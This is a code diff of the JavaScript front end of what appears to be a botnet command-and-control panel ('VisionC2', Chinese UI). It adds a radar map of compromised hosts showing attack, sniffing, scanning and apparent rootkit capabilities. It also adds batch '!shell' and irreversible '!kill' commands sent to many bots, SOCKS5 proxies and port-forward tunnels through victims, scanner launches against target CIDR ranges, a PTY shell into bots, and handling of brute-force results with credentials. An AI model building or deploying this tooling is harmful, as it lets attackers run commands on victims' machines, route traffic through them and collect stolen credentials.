+    '</radialGradient>' +
+    '<linearGradient id="sweep-beam-grad" x1="0%" y1="0%" x2="100%" y2="100%">' +
+    '<stop offset="0%" stop-color="rgba(0, 255, 102, 0.35)"/>' +
+    '<stop offset="50%" stop-color="rgba(0, 255, 102, 0.06)"/>' +
+    '<stop offset="100%" stop-color="transparent"/>' +
+    '</linearGradient>' +
+    '</defs>';
+
+  // Center Radar Radial Glow
+  html += '<circle cx="500" cy="250" r="300" fill="url(#radar-center-glow)"/>';
+
+  // Tactical Lat/Lon Grid Lines
+  html += '<g class="radar-grid">';
+  html += '<line x1="0" y1="125" x2="1000" y2="125" class="radar-grid-line"/>'; // 45° N
+  html += '<line x1="0" y1="250" x2="1000" y2="250" class="radar-grid-line" style="stroke:rgba(168,85,247,0.3);stroke-width:1.2"/>'; // Equator
+  html += '<line x1="0" y1="375" x2="1000" y2="375" class="radar-grid-line"/>'; // 45° S
+  html += '<line x1="250" y1="0" x2="250" y2="500" class="radar-grid-line"/>'; // 90° W
+  html += '<line x1="500" y1="0" x2="500" y2="500" class="radar-grid-line" style="stroke:rgba(56,189,248,0.3);stroke-width:1.2"/>'; // Prime Meridian
+  html += '<line x1="750" y1="0" x2="750" y2="500" class="radar-grid-line"/>'; // 90° E
+  html += '</g>';
+
+  // Concentric Radar Rings
+  html += '<g class="radar-rings">';
+  html += '<circle cx="500" cy="250" r="100" class="radar-ring"/>';
+  html += '<circle cx="500" cy="250" r="200" class="radar-ring"/>';
+  html += '<circle cx="500" cy="250" r="320" class="radar-ring" style="stroke-dasharray:6,6"/>';
+  html += '<circle cx="500" cy="250" r="450" class="radar-ring"/>';
+  html += '</g>';
+
+  // Vector Continents
+  html += '<g class="radar-landmasses">';
+  continentPaths.forEach(function (p) {
+    html += '<path d="' + p + '" class="landmass-path"/>';
+  });
+  html += '</g>';
+
+  // Rotating Radar Sweep Arm
+  html += '<g class="radar-sweep-arm">';
+  html += '<path d="M 500,250 L 500,0 A 250,250 0 0,1 625,33 Z" fill="url(#sweep-beam-grad)"/>';
+  html += '<line x1="500" y1="250" x2="500" y2="0" stroke="#00ff66" stroke-width="1.8" filter="url(#glow-green)"/>';
+  html += '</g>';
+
+  // Render Tactical Nodes
   if (bots && bots.length) {
+    html += '<g class="radar-nodes-group">';
     bots.forEach(function (b) {
-      html += '<div style="background:#131b2e;border:1px solid #1e293b;border-radius:6px;padding:8px 12px;display:flex;align-items:center;gap:10px">';
-      html += '<div style="width:8px;height:8px;border-radius:50%;background:#00ff66;box-shadow:0 0 6px #00ff66"></div>';
-      html += '<div style="flex:1;min-width:0">';
-      html += '<div style="font-weight:700;color:var(--accent);font-size:12px;overflow:hidden;text-overflow:ellipsis">' + escHtml(b.botID) + '</div>';
-      html += '<div style="font-size:11px;color:#888">' + escHtml(b.ip) + ' | ' + escHtml(b.arch) + '</div>';
-      html += '</div>';
-      html += '<span class="cap-badge">' + escHtml(b.country || 'US') + '</span>';
-      html += '</div>';
+      var coords = getBotCoords(b);
+      var isSocks = b.socksActive || b.socksEnabled;
+      var dotColor = isSocks ? '#a855f7' : '#00ff66';
+      var pulseColor = isSocks ? 'rgba(168, 85, 247, 0.8)' : 'rgba(0, 255, 102, 0.8)';
+
+      html += '<g class="radar-node-group" onclick="showRadarTooltip(event, \'' + escHtml(b.botID) + '\', \'' + containerId + '\')" onmouseenter="showRadarTooltip(event, \'' + escHtml(b.botID) + '\', \'' + containerId + '\')">';
+      // Pulse Ripple Ring
+      html += '<circle cx="' + coords.x + '" cy="' + coords.y + '" r="10" fill="none" stroke="' + pulseColor + '" stroke-width="1.2" class="bot-radar-pulse"/>';
+      // Center Glow Dot
+      html += '<circle cx="' + coords.x + '" cy="' + coords.y + '" r="4.5" fill="' + dotColor + '" filter="url(#glow-green)" class="bot-radar-dot"/>';
+      // Tag Label
+      html += '<text x="' + (coords.x + 8) + '" y="' + (coords.y + 3) + '" fill="#cbd5e1" font-size="9" font-family="monospace" font-weight="700" style="pointer-events:none;text-shadow:0 1px 3px #000">' + escHtml(b.botID) + '</text>';
+      html += '</g>';
     });
-  } else {
-    html += '<div style="grid-column:1/-1;text-align:center;color:#666;padding:30px">暂无在线受控端...</div>';
+    html += '</g>';
   }
-  html += '</div></div></div>';
-  c.innerHTML = html;
+
+  html += '</svg>';
+
+  // Bottom Tactical Coordinates Bar
+  html += '<div class="radar-hud-bottom">' +
+    '<span>PROJECTION: CYLINDRICAL EQUIRECTANGULAR</span>' +
+    '<span>TARGET ACQUISITION: 100% RELIABLE (LOCAL VECTOR)</span>' +
+    '</div>';
+
+  html += '</div>';
+
+  container.innerHTML = html;
 }
+
+function updateRadarCoords(e, containerId) {
+  var tag = document.getElementById(containerId + '-coord-tag');
+  if (!tag) return;
+  var rect = e.currentTarget.getBoundingClientRect();
+  var mouseX = e.clientX - rect.left;
+  var mouseY = e.clientY - rect.top;
+
+  var normX = Math.max(0, Math.min(1, mouseX / rect.width));
+  var normY = Math.max(0, Math.min(1, mouseY / rect.height));
+
+  var lng = Math.round((normX * 360 - 180) * 10) / 10;
+  var lat = Math.round((90 - normY * 180) * 10) / 10;
+
+  var lngStr = (lng >= 0 ? '+' : '') + lng + '°';
+  var latStr = (lat >= 0 ? '+' : '') + lat + '°';
+
+  tag.innerHTML = '<span>POS: LAT ' + latStr + ' | LON ' + lngStr + '</span>';
+}
+
+function showRadarTooltip(event, botID, containerId) {
+  event.stopPropagation();
+  hideRadarTooltip();
+
+  var bot = botState[botID] || (window._botsArr ? window._botsArr.find(function(b) { return b.botID === botID; }) : null);
+  if (!bot) return;
+
+  var wrap = document.getElementById(containerId + '-radar-wrap');
+  if (!wrap) return;
+
+  var tip = document.createElement('div');
+  tip.className = 'radar-hud-tooltip';
+  tip.id = 'active-radar-tip';
+
+  var capsHtml = '';
+  if (bot.caps) {
+    if (bot.caps.indexOf('A') !== -1) capsHtml += '<span class="cap-badge">ATK</span> ';
+    if (bot.caps.indexOf('S') !== -1) capsHtml += '<span class="cap-badge purple">SOCKS</span> ';
+    if (bot.caps.indexOf('N') !== -1) capsHtml += '<span class="cap-badge">SNIFF</span> ';
+    if (bot.caps.indexOf('C') !== -1) capsHtml += '<span class="cap-badge purple">SCAN</span> ';
+    if (bot.caps.indexOf('R') !== -1) capsHtml += '<span class="cap-badge">RTKT</span> ';
+  }
+
+  tip.innerHTML = '<div class="rtt-head">' +
+    '<span class="rtt-title">🎯 ' + escHtml(bot.botID) + '</span>' +
+    '<span class="cap-badge">' + escHtml(bot.country || 'US') + '</span>' +
+    '</div>' +
+    '<div class="rtt-row"><span class="rtt-label">IP 地址:</span><span class="rtt-val">' + escHtml(bot.ip) + '</span></div>' +
+    '<div class="rtt-row"><span class="rtt-label">系统架构:</span><span class="rtt-val">' + escHtml(bot.arch) + '</span></div>' +
+    '<div class="rtt-row"><span class="rtt-label">进程/PID:</span><span class="rtt-val">' + escHtml(bot.processName || '-') + '</span></div>' +
+    '<div class="rtt-row"><span class="rtt-label">系统资源:</span><span class="rtt-val">' + bot.ram + 'MB | ' + bot.cpuCores + '核</span></div>' +
+    '<div class="rtt-row"><span class="rtt-label">模块能力:</span><span class="rtt-val">' + (capsHtml || '-') + '</span></div>' +
+    '<div class="rtt-actions">' +
+    '<button class="rtt-btn" onclick="openShell(\'' + escHtml(bot.botID) + '\')">💻 打开 PTY</button>' +
+    '<button class="rtt-btn sec" onclick="selectBotInConsole(\'' + escHtml(bot.botID) + '\')">⚡ 选为目标</button>' +
+    '</div>';
+
+  wrap.appendChild(tip);
+
+  var wrapRect = wrap.getBoundingClientRect();
+  var tipX = event.clientX - wrapRect.left + 15;
+  var tipY = event.clientY - wrapRect.top - 20;
+
+  if (tipX + 230 > wrapRect.width) {
+    tipX = Math.max(10, event.clientX - wrapRect.left - 240);
+  }
+  if (tipY + 160 > wrapRect.height) {
+    tipY = Math.max(10, wrapRect.height - 180);
+  }
+
+  tip.style.left = tipX + 'px';
+  tip.style.top = tipY + 'px';
+
+  activeRadarTooltip = tip;
+}
+
+function selectBotInConsole(botID) {
+  var botInput = document.getElementById('cmd-bot');
+  if (botInput) botInput.value = botID;
+  switchSection('bots');
+  hideRadarTooltip();
+  var dock = document.querySelector('.cmd-dock');
+  if (dock) dock.scrollIntoView({ behavior: 'smooth' });
+}
+
+function hideRadarTooltip() {
+  var tip = document.getElementById('active-radar-tip');
+  if (tip && tip.parentNode) {
+    tip.parentNode.removeChild(tip);
+  }
+  activeRadarTooltip = null;
+}
+
+document.addEventListener('click', function(e) {
+  if (activeRadarTooltip && !activeRadarTooltip.contains(e.target)) {
+    hideRadarTooltip();
+  }
+});
 
 function updateGlobalMap(bots) {
   if (!bots) return;
   var countEl = document.getElementById('map-bot-count');
   if (countEl) countEl.textContent = '在线节点: ' + bots.length;
 
-  if (typeof L === 'undefined') {
-    renderFallbackMap('map-container', bots);
-    renderFallbackMap('full-map-container', bots);
-    return;
+  renderCyberRadar('map-container', bots, false);
+
+  var fullContainer = document.getElementById('full-map-container');
+  var secMap = document.getElementById('sec-map');
+  if (fullContainer && secMap && secMap.classList.contains('active')) {
+    renderCyberRadar('full-map-container', bots, true);
   }
-
-  if (!globalMap) initGlobalMap();
-
-  if (globalMap && typeof L !== 'undefined') {
-    Object.keys(mapMarkers).forEach(function (id) { try { globalMap.removeLayer(mapMarkers[id]); } catch (e) {} });
-    mapMarkers = {};
-
-    bots.forEach(function (b) {
-      var cc = (b.country || 'US').toUpperCase();
-      var coords = countryCoords[cc] || [37.0902, -95.7129];
-      var lat = coords[0] + (Math.random() - 0.5) * 1.5;
-      var lng = coords[1] + (Math.random() - 0.5) * 1.5;
-
-      var icon = L.divIcon({
-        className: 'custom-map-icon',
-        html: '<div class="bot-map-pin" title="' + escHtml(b.botID) + ' (' + escHtml(b.ip) + ')"></div>',
-        iconSize: [14, 14], iconAnchor: [7, 7]
-      });
-
-      var marker = L.marker([lat, lng], { icon: icon }).addTo(globalMap);
-      mapMarkers[b.botID] = marker;
-
-      if (fullMap) {
-        var m2 = L.marker([lat, lng], { icon: icon }).addTo(fullMap);
-        fullMapMarkers[b.botID] = m2;
-      }
-    });
-  } else {
-    renderFallbackMap('map-container', bots);
-    renderFallbackMap('full-map-container', bots);
-  }
-}
-
-function escHtml(s) {
-  if (!s) return '';
-  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
 function toggleTheme() {
   var cur = document.documentElement.getAttribute('data-theme');
-  document.documentElement.setAttribute('data-theme', cur === 'light' ? 'dark' : 'light');
+  var next = cur === 'light' ? 'dark' : 'light';
+  document.documentElement.setAttribute('data-theme', next);
+  showToast(next === 'dark' ? '已切换至深色战术模式' : '已切换至明亮模式', 'info');
 }
 
 function renderActivity(entries) {
@@ -859,20 +1220,32 @@ function switchCmdCat(btn) {
 
   var sel = document.getElementById('cmd-type');
   if (!sel) return;
+  var firstMatchIndex = -1;
   for (var i = 0; i < sel.options.length; i++) {
     var opt = sel.options[i];
     var optCat = opt.getAttribute('data-cat');
     if (!cat || optCat === cat) {
       opt.style.display = '';
+      if (firstMatchIndex === -1) firstMatchIndex = i;
     } else {
       opt.style.display = 'none';
     }
   }
-  for (var j = 0; j < sel.options.length; j++) {
-    if (sel.options[j].style.display !== 'none') {
-      sel.selectedIndex = j;
-      break;
+
+  var optgroups = sel.querySelectorAll('optgroup');
+  optgroups.forEach(function (og) {
+    var hasVisible = false;
+    for (var k = 0; k < og.children.length; k++) {
+      if (og.children[k].style.display !== 'none') {
+        hasVisible = true;
+        break;
+      }
     }
+    og.style.display = hasVisible ? '' : 'none';
+  });
+
+  if (firstMatchIndex !== -1) {
+    sel.selectedIndex = firstMatchIndex;
   }
   updateArgFields();
 }
@@ -895,11 +1268,130 @@ function filterBotTable() {
   if (countEl) countEl.textContent = q ? ('已筛选出 ' + count + ' 个受控端') : '';
 }
 
+// ---------------------------------------------------------------------------
+// Batch Actions & Command Helpers
+// ---------------------------------------------------------------------------
+function onBotCheck(chk, botID) {
+  if (chk.checked) {
+    selectedBots[botID] = true;
+  } else {
+    delete selectedBots[botID];
+  }
+  updateBatchBar();
+}
+
 function selectAllBots(master) {
   var chks = document.querySelectorAll('.bot-chk');
   chks.forEach(function (c) {
     c.checked = master.checked;
+    var id = c.getAttribute('data-id');
+    if (id) {
+      if (master.checked) selectedBots[id] = true;
+      else delete selectedBots[id];
+    }
   });
+  updateBatchBar();
+}
+
+function updateBatchBar() {
+  var bar = document.getElementById('batch-action-bar');
+  var countEl = document.getElementById('batch-count');
+  var count = Object.keys(selectedBots).length;
+  if (!bar) return;
+  if (count > 0) {
+    bar.style.display = 'flex';
+    if (countEl) countEl.textContent = count;
+  } else {
+    bar.style.display = 'none';
+  }
+}
+
+function clearSelectedBots() {
+  selectedBots = {};
+  document.querySelectorAll('.bot-chk').forEach(function (c) { c.checked = false; });
+  var master = document.querySelector('thead input[type="checkbox"]');
+  if (master) master.checked = false;
+  updateBatchBar();
+}
+
+function batchExecuteDirect(cmd) {
+  var ids = Object.keys(selectedBots);
+  if (!ids.length) return;
+  if (cmd === '!kill' && !confirm('警告：确定对选中的 ' + ids.length + ' 个受控端下发自毁销毁指令？此操作不可逆！')) return;
+  logConsoleMsg('-> [批量下发] 正在向 ' + ids.length + ' 个节点执行: ' + cmd + ' (' + ids.join(', ') + ')', null);
+  ids.forEach(function (id) {
+    popupCmd(id, cmd);
+  });
+  clearSelectedBots();
+}
+
+function batchCmdPrompt(baseCmd) {
+  var ids = Object.keys(selectedBots);
+  if (!ids.length) return;
+  var cmd = prompt('请输入要批量下发至选中的 ' + ids.length + ' 个受控端的 Shell 命令:', 'whoami');
+  if (!cmd) return;
+  batchExecuteDirect('!shell ' + cmd.trim());
+}
+
+function syncCmdBotSelect(val) {
+  var inp = document.getElementById('cmd-bot');
+  if (inp) inp.value = val;
+}
+
+function fillShellCmd(txt) {
+  var sel = document.getElementById('cmd-type');
+  if (sel && sel.value !== '!shell') {
+    sel.value = '!shell';
+    updateArgFields();
+  }
+  var argInp = document.getElementById('arg-cmd');
+  if (argInp) {
+    argInp.value = txt;
+    argInp.focus();
+  }
+}
+
+function startScannerCmdWithPayload(cmdName, cidrId, payloadId) {
+  var cidr = (document.getElementById(cidrId) || {}).value || '';
+  var payload = (document.getElementById(payloadId) || {}).value || '';
+  if (!cidr) { showToast('请输入目标 CIDR 网段', 'error'); return; }
+  var fullCmd = cmdName + ' ' + cidr.trim() + (payload.trim() ? (' ' + payload.trim()) : '');
+  sendBroadCmd(fullCmd);
+}
+
+function termQuickCmd(cmd) {
+  var inputEl = document.getElementById('term-input');
+  if (cmd === 'clear') {
+    var outputEl = document.getElementById('term-output');
+    if (outputEl) outputEl.textContent = '[VisionC2 PTY 终端已清屏]\n';
+    showToast('PTY 终端已清屏', 'info');
+    return;
+  }
+  if (!activeWS || activeWS.readyState !== WebSocket.OPEN) {
+    var sel = document.getElementById('term-bot-selector');
+    if (sel && sel.value) {
+      openShell(sel.value);
+      setTimeout(function () {
+        var inp = document.getElementById('term-input');
+        if (inp) { inp.value = cmd; sendTermInput(); }
+      }, 500);
+      return;
+    }
+    showToast('请先选择或连接受控端 PTY 会话', 'error');
+    return;
+  }
+  if (inputEl) {
+    inputEl.value = cmd;
+    sendTermInput();
+  }
+}
+
+function stopPortFwdTunnel(botID) {
+  popupCmd(botID, '!stopportfwd');
+  if (window._activePortFwds) {
+    window._activePortFwds = window._activePortFwds.filter(function (pf) { return pf.botID !== botID; });
+    if (window._botsArr) updateProxies(window._botsArr);
+  }
 }
 
 function updateProxies(bots) {
@@ -908,6 +1400,8 @@ function updateProxies(bots) {
   if (!tbody) return;
   var count = 0;
   var html = '';
+
+  // Render SOCKS5 Proxies
   if (bots && bots.length) {
     bots.forEach(function (b) {
       if (b.socksActive) {
@@ -916,13 +1410,29 @@ function updateProxies(bots) {
           '<td><span class="cap-badge purple">SOCKS5</span></td>' +
           '<td style="font-weight:700;color:var(--accent)">' + escHtml(b.botID) + '</td>' +
           '<td>' + escHtml(b.socksRelay || '0.0.0.0:1080') + '</td>' +
-          '<td>-</td>' +
-          '<td style="color:var(--green)">运行中</td>' +
-          '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!stopsocks\')">停止</button></td>' +
+          '<td style="color:var(--text-dim)">动态全流量代理隧道</td>' +
+          '<td style="color:var(--green)">● 运行中</td>' +
+          '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!stopsocks\')">停止代理</button></td>' +
           '</tr>';
       }
     });
   }
+
+  // Render Active TCP Port Forwarding Tunnels
+  if (window._activePortFwds && window._activePortFwds.length) {
+    window._activePortFwds.forEach(function (pf) {
+      count++;
+      html += '<tr>' +
+        '<td><span class="cap-badge" style="background:rgba(56,189,248,0.15);color:var(--blue);border:1px solid rgba(56,189,248,0.3)">TCP转发</span></td>' +
+        '<td style="font-weight:700;color:var(--accent)">' + escHtml(pf.botID) + '</td>' +
+        '<td>本地监听 :' + escHtml(pf.lport) + '</td>' +
+        '<td style="font-family:var(--mono);color:var(--blue);font-weight:600">' + escHtml(pf.rhost) + ':' + escHtml(pf.rport) + '</td>' +
+        '<td style="color:var(--green)">● 转发活跃</td>' +
+        '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="stopPortFwdTunnel(\'' + pf.botID + '\')">关闭转发</button></td>' +
+        '</tr>';
+    });
+  }
+
   if (badge) badge.textContent = count;
   if (!html) {
     tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--text-dim)">暂无活动的 SOCKS 代理或端口转发隧道</td></tr>';
@@ -961,23 +1471,39 @@ function clearScanResults() {
   if (!confirm('确定清空所有上报的扫描战报与凭据？')) return;
   fetch('/api/scan_results', { method: 'DELETE' })
     .then(function (r) { return r.json(); })
-    .then(function () { loadScanResults(); });
+    .then(function () {
+      showToast('已清空所有扫描与爆破战报', 'info');
+      loadScanResults();
+    });
 }
 
-function copyText(txt) {
+function copyText(txt, label) {
+  var name = label ? (label + ' ') : '';
   if (navigator.clipboard && navigator.clipboard.writeText) {
     navigator.clipboard.writeText(txt).then(function() {
-      alert('已复制到剪贴板: ' + txt);
+      showToast('已复制 ' + name + '到剪贴板: ' + txt, 'success');
+    }).catch(function() {
+      fallbackCopy(txt, name);
     });
   } else {
-    var input = document.createElement('textarea');
-    input.value = txt;
-    document.body.appendChild(input);
-    input.select();
-    document.execCommand('copy');
-    document.body.removeChild(input);
-    alert('已复制到剪贴板: ' + txt);
+    fallbackCopy(txt, name);
   }
+}
+
+function fallbackCopy(txt, name) {
+  var input = document.createElement('textarea');
+  input.value = txt;
+  input.style.position = 'fixed';
+  input.style.opacity = '0';
+  document.body.appendChild(input);
+  input.select();
+  try {
+    document.execCommand('copy');
+    showToast('已复制 ' + (name || '') + '到剪贴板: ' + txt, 'success');
+  } catch (e) {
+    showToast('复制失败，请手动复制', 'error');
+  }
+  document.body.removeChild(input);
 }
 
 function initSSE() {
@@ -1011,12 +1537,30 @@ function initSSE() {
   } catch (e) {}
 }
 
+// Global Keyboard Shortcuts (Point 3.2: ESC & / key ergonomics)
+document.addEventListener('keydown', function (e) {
+  if (e.key === 'Escape') {
+    closeModal();
+    var ctx = document.getElementById('bot-ctx-menu');
+    if (ctx) ctx.style.display = 'none';
+  } else if (e.key === '/' && document.activeElement && ['INPUT', 'TEXTAREA', 'SELECT'].indexOf(document.activeElement.tagName) === -1) {
+    e.preventDefault();
+    var search = document.getElementById('bot-search');
+    if (search) {
+      switchSection('bots');
+      search.focus();
+      showToast('已聚焦受控端全局搜索框', 'info');
+    }
+  }
+});
+
 // Initialize application
 document.addEventListener('DOMContentLoaded', function () {
   updateArgFields();
   startPolling();
   refreshAll();
   initSSE();
+  initCRT();
   loadScanResults();
 });
 
